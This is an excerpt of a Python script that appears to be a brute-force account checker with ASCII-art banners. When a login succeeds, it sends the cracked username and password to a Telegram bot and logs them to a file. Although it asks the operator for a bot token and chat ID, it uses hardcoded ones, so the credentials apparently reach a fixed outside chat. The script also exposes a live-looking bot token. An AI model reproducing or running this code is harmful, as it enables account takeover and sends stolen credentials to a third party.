...
TO =input('TOKEN :')
T =input('ID :')
TOKEN=('6374943559:AAGNWT_l7XkU9DL84IOaDP-o3jJ54mZ8uG4')
chat_id=('5708311976')
bot = telebot.TeleBot(TOKEN)
ti = '[i][bold green] NADER[/bold green][/i]'
te = '''[green]Done 
	────────▄▄▄▄▄▄▄▄▄
	────────▌▐░▀░▀░▀▐
	────────▌░▌░░░░░▐
...
def NADER():
	...
	while True:
		...
		if "logged_in_user" in req:
		   g+=1
		   bot.send_message(chat_id, f"][NADER.OK] {user} | {psw}     : ")
		   print(Panel(f' [NADER.OK] NO'))
		   open('NADER.txt','a').write(user+'|'+psw+'\n')
		   sys.stdout.write(f"\r \033[31m[BAD ] | {bb} \033[33m[CP]|{b}\033[32m[OK][{g}]\r")
		    ...
		    print(Panel(f' \t[yellow][NADER.CP] NO'))
		    bot.send_message(chat_id, f"][NADER.CP] NO")
		    b+=1
		    sys.stdout.write(f"\r \033[31m[BAD ] | {bb} \033[33m[CP]|{b}\033[32m[OK][{g}]\r")
